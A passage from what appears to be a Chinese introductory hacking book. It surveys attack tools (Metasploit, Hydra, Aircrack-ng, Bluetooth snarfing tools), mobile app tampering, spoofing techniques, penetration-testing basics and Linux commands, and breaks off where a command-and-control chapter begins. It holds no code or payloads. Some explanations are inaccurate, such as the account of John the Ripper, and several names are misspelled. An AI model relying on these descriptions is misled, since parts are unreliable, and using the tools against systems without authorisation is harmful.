  \nWeb 应用程序和服务器也会受到 Metasploit 的攻击。在 Metasploit 中，GUI 和命令行界面具有同等地位。Metasploit 提供免费版，但也有付费版（Metasploit\
  \ Pro），它提供了更多功能。\n\n### 2. NMAP\n\nNMAP 是“network mapper”（网络映射器）的缩写。它在扫描网络的同时搜索可访问的端口，以映射网络服务器等。`NMAP`\
  \ 的核心功能是安全分析和对网络进行检查，以检测在线的计算机。`NMAP` 使用 IP 地址和数据包来揭示有关网络的有用细节。例如，它显示了用于访问网络的端口以及计算机上正在使用的应用程序。建议在继续进入\
  \ GUI 之前，先对命令有一定的一些了解。\n\n### 3. Armitage\n\nArmitage 是一种用于网络安全的显示控制工具，它为 Metasploit\
  \ 插件创建了一个接口，简化了 Metasploit，使其不那么复杂从而容易理解。如果你想学习更多关于 Metasploit 的知识，Armitage 是一个很好的开始。Metasploit\
  \ 的所有功能都由 Armitage 在黑客攻击过程中收集，因为它们的目的是利用、绕过和突袭网络。\n\n### 4. Jhon the Ripper\n\n\
  JTC 是“Jhon the Ripper”的缩写。它是一个突破受密码严密保护区域的著名工具。在黑客世界中被简单地称为 Jhon，它是启动所谓的“字典入侵”的主要工具。Jhon\
  \ the Ripper 拥有一个名为 `word list`（字典列表）的文本库，由以前破解的密码组成。Jhon the Ripper 从它的库中选择这些密码中的一个，并替换要破解密码的单词列表。然后它给出新输入值的结果。换句话说，黑客取一个以前破解的密码，并干预系统，使得这个以前破解的密码替换掉要破解的密码。之后，Jhon\
  \ 重新启动过去的成功并重新破解被替换的密码。Jhon the Ripper 与 `THC Hydra` 之间相似相似，后者是类似的破解工具。细小的区别在于 Jhon\
  \ 用于离线破解，而 Hydra 用于在线破解。\n\n### 5. Wireshark\n\nWireshark 是一个开源工具，通过网络流量大纲来检查网络。该工具属于网络嗅探器类别。\n\
  \nEthereal 是 Wireshark 的旧名。它的核心功能是监控用于监控网络流量的差异，并调查往返的数据包。\n\n\n\n\n# Hydra 与 Burp\
  \ Suite\n\n`Hydra` 与 `Jhon` 非常相似，是一个密码破解工具。在专家级黑客手中，`Hydra` 可能是危险的。它通常与 `Jhon` 结合使用，因为两者经常被同时调用。`Hydra`\
  \ 通过结合字典攻击和暴力破解的力量，对输入界面进行攻击来破解密码。`Hydra` 支持大量的协议，示例包括 `SSH`、`POP3`、`IMAP`、`Database`、`SMB`、`VNC`、`LDAP`、`RTPS`、`HTTP`、`POP`、`TCP`、`SMTP`\
  \ 等。\n\n目前网络上存在的最强大的工具是“Suite”。`Suite` 是一个提供 Web 服务和渗透测试的应用程序。当其被充分利用时，其潜力几乎是无限的。以下是\
  \ Burp Suite 的一些功能。\n\n- **拦截代理（Intercepting Proxy）** 是一个监控并改进应用程序与 浏览器之间通信的功能。\n\
  - **爬虫（Spider）** 是一个用于指定网络上存在的所有文件列表、名称和特征的功能。\n- **Web 扫描器（Web Scanner）** 是一个扫描服务器漏洞的重要功能。\n\
  - **入侵者（Intruder）** 是一个可以对网络发起攻击的功能。它被用于扫描漏洞并利用它们。\n- **重放器（Repeater）** 代表用户进行改进并发送请求。\n\
  - **序列器（Sequencer）** 检查 `CSRF` 令牌、身份验证令牌等的不规则性。\n- **扩展（Extensions）** 允许用户包含其自定义的插件，或直接从系统数据库中安装插件。它们被用于创造性地策划战术性和隐蔽攻击。\n\
  \n## 7. OWASP Zed\n\n`OWASP Zed Attack Proxy`（简称 `ZAP`）的特点之一是它没有价格标签。它的开源版本向公众开放。`OSWAP`\
  \ 是一个流行的功能且有效的代理工具，可以替代 Burp Suite。`OSWAP` 用户界面友好，并且能够高效准确地完成工作，因为它能暴露 Web 应用程序的漏洞。`OSWAP`\
  \ 的功能总结如下：\n\nA. 手动测试\nB. 检查网络泄露\nC. 检查用户目标\n\n## 8. 工程工具包\n\n`Social-Engineering\
  \ Toolkit`，又称为 `SET`，是另一个值得提到的工具。使用此工具，攻击是针对操作系统的用户而非系统本身发起的。它具有某些允许访问 `Java applets`\
  \ 的特殊属性。用户感知这些 applet，因为 `SET` 确保了所有操作都在后台进行。该命令行在最大化运行时，可以产生有效的结果。它运行在包括 `Linux`\
  \ 和 `Windows` 在内的任何基础操作系统上。\n\n## 9. Aircrack-ng\n\n这是另一个破解密码并允许用户访问互联网的工具包。在高手手中，它可以是一个盈利的工具。然而，它是困难的并且需要大量的努力。对于新手来说，`Aircrack-ng`\
  \ 是一个短波破解程序。它是一个 `802.11` `WEP` 和 `WPA-PSK` 密钥破解包，可以从各种数据中恢复密钥。然而，数据必须具有足够的包并被捕获（在\
  \ `monitor mode` 下）。`Aircrack-ng` 是你绝对想要使用的不可不可少的工具。\n\n新手应该能够使用正确的工具破解加密的 `WEP`。然而，破解\
  \ `WPA/WPA2` 需要大量的努力。\n\n# 第 5 章 移动设备攻击\n\n随着手机（尤其是智能手机）使用量的剧增，移动攻击变得越来越流行。手机可以被破解以提取设备信息、盗取个人信息、打电话甚至损坏设备使其无法使用。\n\
  \n带有蓝牙的手机还可以使用流行的软件工具进行破解，如 `Super Bluetooth Hack`、`Blue Scanner`、`Bluesnarfer`、`Blue\
  \ sniff`、`btCrawler` 等。它们的功能描述如下：\n\n## Super bluetooth hack\n\n这是一种流行的手机攻击工具，用于扫描和发现最近的移动设备并与之建立连接。连接后，可以访问受害者的电话簿或\
  \ `SMS`，甚至切换目标设备的开关。如果目标设备的安全性较低，该工具还可以允许黑客通过目标设备发送 `SMS` 或拨打电话。\n\n## Blue scanner\n\
  \n`Blue Scanner` 是一种软件工具，用于发现所有开启了蓝牙的最近移动设备，并尝试在无需配对的情况下获取这些每个设备的信息。\n\n## Bluesnarfer\n\
  \n`Bluesnarfer` 是一种攻击工具，可以连接到蓝牙设备并从中窃取信息。这种使用 `Bluetooth` 连接窃取信息的行为被称为 `Bluesnarfing`。`Bluesnarfer`\
  \ 可以让黑客访问受害者的短信、日历、联系人、电子邮件，有时还有图片和视频。这一切可以在受害者不知情且无需与受害者手机配对的情况下完成。使用该工具，黑客可以发送恶意代码，这些代码可能会损坏或完全关闭目标设备。\n\
  \n## Blue sniff\n\n`Blue sniff` 本身并不是攻击工具，但它可以发现处于“隐藏”模式的最近蓝牙设备。隐藏模式下的蓝牙设备在普通的蓝牙扫描期间无法被发现。`Blue\
  \ Sniff` 是一个 `Linux` 实用程序，可以轻松完成工作。\n\n## 攻击移动应用\n\n智能手机之所以流行是因为它们可以安装各种应用程序。移动应用可以被破解。当从应用商店访问应用时，其二进制代码被下载并由设备执行。但这些二进制文件存在可以被技术良好的黑客利用的漏洞。此类漏洞可分为两类，即：\n\
  \n- 代码修改/注入\n- 反向工程\n\n### 代码修改/注入\n\n这是通过在应用程序二进制文件中插入恶意代码来实现的。黑客在二进制文件中执行代码修改的主要动机是更改应用程序的行为。通常，二进制代码修改是为了：\n\
  \n- 修改应用程序许可协议\n- 破坏其安全功能\n- 从应用程序执行非法交易\n- 解锁完整版本（如果应用是试用版）\n- 禁用广告显示\n\n进行修改后，黑客可以将其作为软件补丁或破解进行发布。此类软件补丁可以被下载以绕过应用的限制。\n\
  \n### 反向工程\n\n在反向工程中，首先使用代码分析工具对二进制代码进行分析。根据分析报告，黑客可以反向工程应用二进制文件以获取源代码和其他敏感信息。窃取的的代码可以构建不同品牌的类似应用，然后提交到应用商店。\n\
  \n使用代码修改和反向工程技术可以执行的任务如图所示。\n\n# 第 6 章 渗透测试基础\n\n## 什么是渗透测试？\n\n渗透测试，最简单的形式是一种计算机安全测试类型，用于确定计算机系统的安全性。通常，该测试是为了发现给定计算机系统或应用程序中可能存在的漏洞和各种风险。许多计算机安全专家描述、执行和营销渗透测试的方式并不相同。这导致它与其他计算机安全流程（如安全评估、漏洞扫描和合规性审计）相混淆。渗透测试在许多关键方面与其他所有过程都不同：\n\
  \n\n\n\n\n与漏洞扫描不同，渗透测试不仅会发现漏洞；还会探索所有未被覆盖的漏洞，以证明计算机系统面临的真实世界攻击向量。\n\n尽管渗透测试可能会使用自动化工具和流程，但其核心重点在于执行测试的团队的人类技能和健全判断。这是因为安全威胁可以击败最先进、最复杂的工具和技术，但无法逃脱能够跳出框架思考的人类头脑。\n\
  \n安全和合规性审计是寻找安全措施和配置的存在，而渗透测试则更进一步，旨在确定这些安全措施和配置针对真实世界攻击有多有多有效。\n\n渗透测试针对特定目标探索多种攻击向量，以制定出更强大的安全组合，从而有效保护计算机系统。\n\
  \n## 为什么你需要渗透测试？\n\n渗透测试对于计算机用户来说非常有价值，特别是对于拥有大量计算机并使用计算机处理高价值信息（如员工薪资和个人详情）的大型组织而言。以下是企业投资渗透测试的重要原因：\n\
  \n### 模拟攻击环境\n保护你的计算机免受攻击的唯一方法是让你确切知道入侵者将如何访问你的计算机。渗透测试可以帮你了解这一点，因为它通过使用各种攻击向量模拟攻击环境，从而让你了解如何增加计算机安全性的最佳方法。\n\
  \n### 帮助发现计算机安全系统中的安全漏洞\n大多数未被察觉的主要计算机攻击都是利用了计算机安全系统的漏洞。渗透测试通过检查你的计算机软件和功能，以识别入侵者可以从中获取访问的安全弱点。这些是重要信息，随后用于加固特定系统的计算机安全。\n\
  \n### 帮助找到击败黑客攻击的方法\n黑攻击不断变化并适应现有的计算机安全措施。这意味着，为了有效保护你的计算机，你需要找到可以击败黑客攻击的方法。通过渗透测试，你可以模拟黑客将如何进入你的系统，这将帮助你了解如何最好构建计算机安全，以将黑客攻击拒于门外。\n\
  \n### 估计对业务的潜在攻击规模\n不同类型的攻击会导致不同程度的损失。此外，某些攻击在特定领域比其他领域更常见。为了保护你的业务、财务记录和客户免受潜在攻击的伤害，了解你业务领域内各种攻击的规模至关重要。这将为你为什么需要投资各种类型的计算机安全技术提供证据。\n\
  \n### 帮助增强你的管理系统\n计算机安全是信息管理的一个重要组成部分。这意味着如果你使用计算机经营业务，那么计算机安全就是你管理系统中不可或缺的一部分。渗透测试为你提供了有关计算机安全威胁和各种攻击向量漏洞程度的重要信息。这有助于重新组织管理业务的方式，以便高效地保护你的计算机系统和业务信息。\n\
  \n### 防止你免受财务损失\n简单的安全泄露可能导致任何业务遭受巨大损失。分子可以利用计算机漏洞进行欺诈活动，导致巨大的损失。此外，他们可能会窃取你的客户数据并分享到网上，这可能导致业务损失甚至引发法律诉讼，从而进一步损害你的财务状况。\n\
  \n### 识别无法检测的漏洞\n如今，随着技术的进步，有很多难以检测的漏洞。你需要关于此类漏洞的信息，以有效保护你的计算机系统。通过渗透测试，你可以了解哪些区域和类型的攻击将难以被检测，并在它们发生时采取措施进行应对。\n\
  \n### 测试你的安全系统挫败攻击的能力\n你的计算机安全措施有多有效？了解此点的唯一方法就是通过渗透测试。渗透测试将帮助你了解攻击者访问你的计算机有多容易，从而做出有效响应。\n\
  \n现在很清楚，你之所以进行渗透测试有许多原因。定义渗透测试的性质和范围很大程度上取决于你的目标。如果你担心业务受到攻击，那么与主要目标是通过合规评估相比，你将会考虑更激烈、更具侵略性的渗透测试。\n\
  \n那么，适合你的渗透测试是什么？如果渗透测试是你所在行业的要求，你可能会倾向于寻找你能找到的最便宜的渗透测试服务。但这并不总是处理此问题的正确方法。考虑以下两个因素：\n\
  \n1. **你有渗透测试的预算吗？**\n如果你已经有了渗透测试的预算，那么没有走捷径，相反，应利用预算通过扩大渗透测试的性质和范围来让你的钱物有所值。\n\
  2. **攻击的影响是什么？**\n在决定渗透测试范围之前，找出攻击的影响至关重要。例如，如果攻击可能导致资金、业务损失以及针对你的法律诉讼，那么你将会考虑投入高强渗透测试。\n\
  \n## 雇用渗透测试服务供应商时需要考虑的\n\n要进行渗透测试，你需要一位拥有正确经验、技能和工具的专家来完成工作。然而市场上有很多提供此类服务的人，其中一些并不胜任这项工作。因此，选择正确的团队来为你工作至关重要。在雇佣他人进行渗透测试时，你应该考虑以下重要建议：\n\
  \n### 寻找正确的资质\n资质是获得合适渗透测试人员的关键。在考虑团队资质之前，务必确保他们与被测试计算机系统的管理没有联系。这对于消除他们工作中的偏见至关重要。例如，如果你由第三方管理你的计算机系统，你不应该再次雇佣他们来做渗透测试，因为即使他们符合工作要求，也难免产生偏见。\n\
  \n要判断某人是否具有渗透测试的正确技能，你需要了解他们持有的证书类型。证明渗透测试人员能力和技能的一些证书包括：\n- 认证道德黑客 (`CEH`)\n- GIAC\
  \ Web 应用程序渗透测试员 (`GWAPT`)\n- 攻击安全认证专家 (`OSCP`)\n- 高级渗透测试员 (`GXPN`)\n- CREST 渗透测试认证\n\
  - GIAC 认证渗透测试员 (`GPEN`) 等。\n\n\n\n\n\n你还应该关注过去的经验，因为在该领域拥有丰富经验的人将为你比新手提供更好的服务。例如，你应该对了解他们进行渗透测试的年限、他们工作过的公司类型、他们参与过的项目类型，以及证明服务提供者所陈内容的参考资料产生兴趣。这非常重要，因为一个在该领域相对较新但主要从事你所属领域项目的服务者，可能比一个在其他领域拥有丰富经验但在你所属的领域几乎没有经验的服务者是更好的选择。\n\
  \n在聘佣测试员之前，确保你聘佣的是拥有合适工具的测试员也是重要的。通过对候选人进行质问，确保你进行了适当的背景调查，这将帮助你了解他们是否拥有足够的经验、技能和工具来满足你的要求完成工作。这是你获得最合格的服务者来执行渗透测试的唯一途径。\n\
  \n## 了解渗透测试的性质和范围\n\n如果你清楚自己想要做什么，你更有可能找到合适的人来完成；但如果你不知道想要什么，那么任何人都能胜任这项工作。合适的团队将帮助你定义渗透测试的范围及其性质。因此，在将任务交给最合格的团队之前，你需要先坐下来看看待完成工作的性质。如果你的服务提供者似乎并不理解你想要做什么，那么他/她就不是这项工作的合适人。优先考虑那些想要将测试范围限制在漏洞和攻击最多的关键区域的个人。这很重要，因为它将有助于测试过程集中在你计算机安全的关键区域。\n\
  \n## 黑盒或白盒渗透测试\n\n这两种渗透测试对于决定你如何有效地执行渗透测试过程至关重要。它们彼此之间各有优劣。例如，白帽渗透测试（在这种情况下测试人员预先拥有系统或网络访问的信息）耗时更短、成本更低，让你留有充足的时间和资金来加强计算机安全，它有助于突出内部人员可能对计算机系统造成的威胁，从而保护你的计算机系统免受此类威胁。另一方面，黑盒渗透测试不允许测试人员拥有内部知识的便利，因此从真实世界攻击者的角度为系统提供了最好的测试结果。此外，由于攻击者花费了大量时间，黑盒测试可能会提供关于系统内部其他漏洞的大信息。\n\
  \n在聘佣渗透测试员之前，了解渗透测试的类型很重要，你应该只聘佣该特定渗透测试的专家或对此感到熟悉的人。例如，如果一个服务提供者告诉你他们只擅长白帽测试，而你想进行黑盒测试，那么考虑寻找另一个擅长黑盒测试的人。\n\
  \n## 目标和计划\n\n你的目标和计划应该能够指导你选择合的渗透测试员。你希望通过渗透测试实现什么？你正在考虑的渗透测试员的经验是否符合这些目标？某些渗透测试员可能拥有经验和正确的资质，但他们的经验并没有表明他们能够实现你的目标和计划。因此，在开始寻找人员进行渗透测试之前，请确保你已经为该过程设定了目标和计划。这不仅能帮助你找到合适的人才，还将帮助你设定范围并衡量过程的结果。\n\
  \n## 你何时必须执行渗透测试？\n\n应该定期进行渗透测试，以保护你的计算机系统并保护你的数据和信息不受不断演变的攻击。除了定期进行渗透测试外，你应该确保在以下情况下进行渗透测试：\n\
  \n* 你发现了计算机系统的新威胁\n* 你为计算机系统增加了新的硬件/网络或基础设施\n* 你安装了新软件或更新了系统软件\n* 你搬了办公室或增加了办公空间\n\
  * 你创建了新的用户策略或程序\n\n# 第 7 章 欺骗技术\n\n系统可以通过本地或通过互联网使用以下方法之一被破解：\n\n* 使用优 盘或外部硬盘用病毒感染系统\n\
  * 伪造用户身份以获得系统的访问权限\n* 滥用网络系统与用户之间的信任\n\n现在，在所有安全协议和强密码的保护下，黑客是如何能够访问或攻击系统的？尽管有只有某些授权人员才能访问网络的严格规则，黑客又是如何进入网络的呢？大多数情况下，答案是欺骗（Spoofing）。\n\
  \n不同类型的欺骗如下：\n\n* IP 欺骗\n* ARP 欺骗\n* DNS 服务器欺骗\n* 网站欺骗\n* 电子邮件欺骗\n\n## IP 欺骗\n\n\
  网络并不允许访问其所有的 IP 地址。只有某些受信任的 IP 地址可以进入网络。为了访问网络，黑客使用伪造受信任 IP 地址的 IP 地址。\n\n例如，假设某个网络允许\
  \ IP 地址 `x.x.x.x` 访问其系统。一个系统 IP 地址为 `y.y.y.y` 的黑客通过伪造其 IP 地址使其看起来像 `x.x.x.x` 以获得网络访问。\n\
  \nIP 欺骗主要是为了向目标系统发送大量数据以增加流量。发送比系统能处理更多的数据包将导致目标系统过载。所有数据包似乎都来自几个伪造的 IP 地址。在另一种方法中，可以伪造目标系统的\
  \ IP 地址向网络上的其他系统发送大量数据包。对于其他系统来说，数据包似乎是从目标系统发送的，但实际上是黑客从他们的系统发送的。\n\n某些网络使用 IP 认证而不是用户登录认证。在这些认证方案中，请求访问的机器的\
  \ IP 根据信任关系进行验证。在这种情况下，黑客可以通过模仿具有访问权限的信任机器来进行欺骗。\n\n## ARP 欺骗\n\n地址解析协议（ARP）是一种将机器的\
  \ IP 地址映射到 MAC 地址的协议。`MAC` 代表介质访问控制。系统的 MAC 地址就是硬件的物理地址。ARP 欺骗涉及黑客伪造 ARP 消息并在网络中发送，使得黑客系统的\
  \ MAC 地址与网络上的授权系统 IP 地址关联。因此，所有要发送给授权系统的数据实际上将发送到黑客系统。\n\nARP 欺骗只能在局域网（LAN）中进行。这是因为地址解析协议只能在局域网中使用。\n\
  \n## DNS 服务器欺骗\n\n\n\n\n\n域名系统（DNS）是一种将域名映射到其 IP 地址的服务。DNS 服务器允许将电子邮件地址、统一资源定位符（`URLs`）和域名解析为各自的\
  \ IP 地址。域名欺骗攻击涉及攻击者操纵 DNS 服务器，使得特定的域名映射到由攻击者控制的 IP 地址。这些 IP 地址包含受恶意软件感染的文件。这种类型的欺骗通常用于在互联网上传播计算机病毒和蠕虫。\n\
  \n![Description: Description: https://lh6.googleusercontent.com/jSwI_6NCbnjDM9vFjdzgkIxck2ShTARrd0GOM0ZwfwPYfkRIr5hykdKX1Ljs-gEaKDEgrfgf2swjdRKggFCFRXDgO_gQwv0zJiTU8sjBxcnsuuM632yK26Ss_mY3ghirfhgzUbA](img/00042.jpeg)\n\
  \n## 网站欺骗\n\n网站欺骗涉及创建一个伪装合法网站的虚假网站。通常，它的设计与原始网站相同，有时可能还具有相似的 URL。因此，当个人误将欺骗网站认为是原始网站并输入敏感信息（如用户名/密码或其他个人详情，如电话号码、社会安全号码或地址）时，这些信息实际上就落入攻击者手中了。\n\
  \n在更严重的攻击中，攻击者可能会创建一个 WWW（万维网）的影子副本，使受害者的数据流量转向攻击者的系统。结果是攻击者可以捕获受害者的隐私信息。通过使用控制字符可以让欺骗网站的\
  \ URL 看起来是真实的。网站的实际地址在背景中隐藏。\n\n例如，假设你是一个银行客户，并使用银行网站进行网上银行。假设你被重定向到一个虚假网站，该网站与原始银行网站的设计和布局相同。它可能还具有与银行网站\
  \ URL 相似的 URL。因此，你误将假网站认为是实际网站，并输入了信用卡详情和 PIN 码等敏感信息。现在，运行虚假网站的攻击者捕获了你输入的信息，并可能将其用于恶意目的。\n\
  \n## 电子邮件欺骗\n\n电子邮件欺骗涉及在发送邮件之前伪造“发件人地址”，使其看起来像是来自受信任的人员或来源。垃圾邮件发送者为了欺骗接收者关于邮件来源的合法性，大多使用电子邮件欺骗。电子邮件欺骗也用于通过邮件传播蠕虫或病毒。\n\
  \n例如，假设个人“X”收到了一封被感染的邮件，并在他们不知情的情况下打开了它。随邮件发送的蠕虫代码感染了 X 的邮箱账户。随后蠕虫代码通过 X 的邮件联系人传播，并检测到两个个人“Y”和“Z”的电子邮件地址。假设\
  \ X、Y 和 Z 是朋友。\n\n在 X 不知的情况下，蠕虫代码编写了一封类似的受感染邮件并将其发送给 Y。如果 Y 从未知来源收到邮件，这并不是大问题，因为他们不太可能打开它。但实际发生的情况是，蠕虫代码在将邮件发送给\
  \ Y 之前使用 Z 的电子邮件地址伪造“发件人地址”。在 Y 的收件箱中，这封被感染的邮件看起来来自 Y 的朋友“Z”。但实际上，它是由蠕虫代码传播的邮件。由于“发件人”显示的是\
  \ Z 的邮件地址，Y 可能会打开这封被感染的邮件。\n\n# 第 8 章：Linux 的基本功能\n\n现在是时候学习一些为了能够自信地使用 Linux 而需要的基础知识了。这些功能对于帮助你轻松操作计算机系统至关重要。让我们花点时间看看这些基本功能，并学习它们如何为我们服务。\n\
  \n## 界面的登录与注销\n\n涉及到 Linux 操作系统，每次尝试进入系统时，你都需要提供登录凭据，即用户名和密码。此外，在运行 Linux 系统时，你有两种模式可以选择，我们将在下文中介绍它们：\n\
  \n### 图形模式\n\n图形模式是你的台式电脑的默认模式。基本上，如果计算机屏幕在允许进入之前要求密码和用户名，你就知道你正在使用图形模式。要登录，你只需要输入已设置登录凭据，然后按\
  \ `OK` 或 `ENTER` 继续。\n\n输入这些登录信息后，有时需要几分钟来加载所有内容并准备就绪；启动所需的时间取决于计算机的性能及其处理能力。当计算机完成加载后，你需要打开一个\
  \ `xterm`，也称为终端窗口。你可以通过点击“应用程序”（Applications）然后选择“实用程序”（Utilities）来找到此工具。注意：在某些较版本的\
  \ Linux 中，会有一个图标可以加速此过程，你只需点击它，而无需执行上述步骤。\n\n终端窗口基本上是你的操作系统的控制面板。你想要对操作系统执行的大多数操作都可以通过此工具完成，按照一般规则，当你打开终端窗口时，它应该显示某种命令提示符。通常这将以你的系统用户名开头，以及一些关于已执行更新的信息。\n\
  \n当你准备好在此模式下注销时，需要确保已关闭终端窗口。然后你可以找到注销图标，或者在主菜单中搜索“注销”选项。如果你忘记关闭应用程序或窗口，也没大问题，因为计算机可以为你处理，但当你下次回来时系统会尝试恢复这些窗口和程序，这会降低启动速度。当你看到屏幕再次要求登录凭据时，你就知道已经注销了系统。\n\
  \n### 文本模式\n\n系统中用于凭据的另一种模式是文本模式。当整个屏幕是黑色且只有字符时，你就能知道自己处于文本模式。这种模式的屏幕将显示一些数据，包括计算机名称、关于计算机的一些信息，以及一个用于登录的提示符。这与图形模式有所不同，因为在输入用户名后你需要按\
  \ `ENTER` 键，因为屏幕上没有可以点击的按钮或链接。然后输入密码并再次按 `ENTER`。\n\n这种模式的一个特点是，当你输入用户名和密码时，看不到任何输入的迹象。你看不到单词、字母，甚至是点或特殊字符在输入时出现。对于新使用该系统的人来说，这可能会让他们困惑，但出于安全考虑，它是这样设计的。\n\
  \n\n\n\n当你准备好退出此系统时，只需输入 `logout` 然后按回车键（ENTER）。当屏幕恢复显示并再次提示你输入登录凭据时，你就知道已经成功退出系统了。\n\
  \n## 基本命令\n\n既然你已经了解如何根据我们所处的模式登录和退出 Linux 系统，现在是时候开始学习我们将用到的一些基础命令了。这些命令学习起来非常简单，如果你过去接触过某些编程语言，你可能以前见过其中一些命令了。初学者应该学习的一些命令包括：\n\
  \n- `ls` - 这将显示你当前所在目录下的文件列表。\n- `passwd` - 此命令将更改当前在系统中的用户的密码。\n- `pwd` - 这将显示当前工作目录。\n\
  - `cd directory` - 这将切换目录。\n- `man command` - 这将读取命令的帮助页（man pages）。\n- `exit` 或\
  \ `logout` - 这将更容易离开当前会话。\n- `info command` - 这将读取命令的详细信息页（info pages）。\n- `file\
  \ 'filename'` - 这将显示指定文件名的文件类型。\n- `apropos string` - 这个命令将使用“what is”数据库搜索字符串。\n\
  \n## 其他需要注意的事\n\n在大多数情况下，你会单独执行这些命令。例如，你只需要输入 `ls`，系统就能为你完成其余的工作。如果你指定了选项（option），命令的行为将会有不同，你可以通过引入横杠来实现。在\
  \ GNU 环境下工作时，只要你用两个横杠引入，它就能接受一些较长的选项，但某些命令并没有这些额外的选项。\n\n被称为命令“参数”（argument）的内容，是指你想要应用命令的对象的指定。一个很好的例子是\
  \ `ls /etc`，在这个例子中，`/etc` 是目录和参数，而 `ls` 是命令。这个特定的参数表示你想查看 `/etc` 目录的内容，而不是默认目录。然后你可以点击回车键进入该目录。根据你想要执行的操作，某些命令需要参数来帮助系统理解你正在寻找的内容。\n\
  \n# 使用 Bash 特性\n\nBash 是你将使用的大多数 Linux 系统上的默认 GNU shell，它将让你更方便地使用某些键组合来快速快捷地完成任务。使用\
  \ Bash shell 时常用的一些常用特性包括：\n\n- `Tab` – 这将补全命令或文件名。如果有多个选项，系统将使用视觉或音频通知你。如果系统检测到有很多可能性，它会询问你是否想要检查所有选项。\n\
  - `Tab Tab` – 这将显示文件名或命令的补全候选列表。\n- `Ctrl + A` – 这将光标移动到当前命令行的开头。\n- `Ctrl + C`\
  \ – 这将结束你的计算机程序，然后显示 Linux 提示符。\n- `Ctrl + D` – 这将让你退出当前会话。这是一个与输入 `exit` 或 `logout`\
  \ 类似的组合键。\n- `Ctrl + E` – 这将光标移动到当前命令行的末尾。\n- `Ctrl + H` – 这的功能类似于按下键盘上的退格键（backspace）。\n\
  - `Ctrl + L` – 这将清除当前终端。\n- `Ctrl + R` – 这将搜索命令历史。\n- `Ctrl + Z` – 这将允许你挂起计算机程序。\n\
  - `右箭头 / 左箭头` – 这些按键将让你更容易在当前所在的命令行上移动光标。如果你需要添加更多字符或对程序进行某些更改，可能会发现它们很有用。\n- `上箭头\
  \ / 下箭头` – 这些按键将让你更容易浏览系统历史。你可以访问任何想要重复的行，在需要时更改某些数据，然后按回车键快速执行这些新命令。\n- `Shift\
  \ + Page Up/ Shift + Page Down` – 使用这些组合键将允许你查看终端缓冲区。\n\n随着你对 Linux 系统越来越熟悉，你将开始更好地理解这些命令是如何运作的，并学习其他命令，这会让使用\
  \ Linux 系统变得更加容易。这些只是你应该学习使用的少数初始命令，因为它们将让你在系统中的穿行变得容易得多。尝试一下并练习登录和退出系统，以便在继续学习之前对它的工作原理有一个感觉。\n\
  \n# 操作文件系统\n\n我们接下来要处理的是 Linux 系统内部的文件和目录。许多新用户在使用此操作系统时会遇到问题，因为他们根本不知道存储了哪些信息，甚至不知道信息存放在哪里。本章旨在回答这些问题，让你的\
  \ Linux 体验变得简单得多。\n\n## 不同类型的文件\n\n在大多数情况下，你处理的是普通文件。这些是包含输出、文本文件和程序等普通数据的文件。Linux\
  \ 的运行方式与 Windows 不同，请记住这一点。屏幕上的文件看起来与你习惯的相似，但它们存储的位置以及工作方式会有些不同。\n\n基本上，文件系统从根目录（root）开始，称为简单路径（simple\
  \ path）；这是所有一切开始的地方和去的地方。除了根目录及其分出的端口外，事情看起来与你习惯的相似，但你可能会发现它们更整洁、更容易处理。\n\n文件扩展名仍然存在以帮助用户，这在刚开始可能会让它们变得有些困难，但随着时间的推移，你会开始体会文件扩展名，因为它们让你更容易找到所需的文件。\n\
  \n## 文件系统的布局\n\n为了便于查找和理解，你会发现 Linux 上的文件系统类似于树形。随着你添加或删除更多文件，该结构会发生变化和增长。总的来说，它们都从根目录延伸，然后你所做的更改将出现在之后，即树的更深处。记住，文件树上的名称并不是必须的，但它们是为了惯例和方便导航而存在的。\n\
  \n文件系统的树从斜杠开始，也称为根目录。它被显示为 `/`。根目录将包含所有的底层文件以及操作系统内部显示的所有目录。斜杠通常会跟在根目录下方的一个目录之前。这基本上指示了这些目录的位置，并帮助将其与计算机上可能具有相似名称的其他位置区分开来。每当你使用新版本的\
  \ Linux 时，请确保首先检查根目录以找到你想要的文件。\n\n\n\n\n# 根目录的子目录\n\n你的根目录之后会有各种子目录，以构成你操作系统中的系统树。一些你可能会发现对你有帮助的子目录包括：\n\
  \n* `/bin` – 此目录包含你的普通程序，包括系统管理员、系统和用户共享的程序。\n* `/dev` – 此目录存放 CPU 上所有外围硬件的引用。通常情况下，这些将以具有特殊特征的文件形式显示。\n\
  * `/boot` – 此目录由启动文件和内核组成。某些 Linux 系统还会包含大统一启动加载程序（或 `grub`）的信息。\n* `/etc` – 这是一个包含与系统配置相关文件的子目录。这与你在\
  \ Windows 中找到控制面板非常相似。\n* `/home` – 这是大多数普通用户的主目录。\n* `/misc` – 这是一个用于存放任何被视为杂项文件的子目录。\n\
  * `/lib` – 此目录包含计算机上所有程序程序的库文件。\n* `/opt` – 此位置存放一些额外程序以及第三方程序。\n* `/root` – 这是系统管理员使用的主目录。\n\
  * `/proc` – 这是一个虚拟文件数组，包含有关系统资源的数据。每当你想要查看有关此部分的更多信息时，只需打开终端窗口并输入 `man proc` 即可开始。\n\
  * `/initrd` – 此目录存放启动过程的数据。确保你永远不要删除。\n* `/lost+found` – 此目录包含系统故障并必须突然关闭时保存的文件。\n\
  * `/tmp` – 这是一个临时存储单元，由你的操作系统使用。你不应该使用它来保存任何工作，因为当系统重启时，此文件夹中的所有文档将被清空。\n* `/sbin`\
  \ – 此目录存放操作系统和系统管理员使用的计算机程序。\n* `/usr` – 此目录包含所有用户相关计算机程序的文档、程序和库。\n* `/var` – 用于存储用户生成的任何临时文件和变量。这些包括文件下载、日志文件和邮件队列等。\n\
  \n你可以根据文件在计算机中的存储位置来找到你正在处理的文件类型。如果你不确定它存储在哪里，请查看这些文件起始符，并根据它的内容、计算机最初认为它是什么等信息，看看它最适合放在哪里。你也可以通过在文件开头添加这些子目录之一，来决定你希望文件存储在哪里。\n\
  \n虽然这个系统在刚开始时可能有点难以理解，你可能觉得自己在处理文件后永远再也找不到它们，但 Linux 的保存树系统实际上比你在其他操作系统中发现的简单得多。如果你能够在\
  \ Windows 操作系统中导航以找到你的项目和文件，你就能轻松理解 Linux 文件系统是如何工作的。这只需要一点时间来学习每个东西的称呼并适应这个新系统。\n\
  \n# 第 9 章 接管命令与控制\n\n本章将介绍强大的 Python 脚本的新来源，你可以重新利用这些脚本来通过目标机器上的外部控制系统收集数据，甚至使用现成的\
  \ API 来执行命令和安装更新。在本章结束时，你应该能够创建一个 Python 工具，你可以通过互联网远程控制该工具，向目标机发布命令并接收捕获的数据。\n\n\
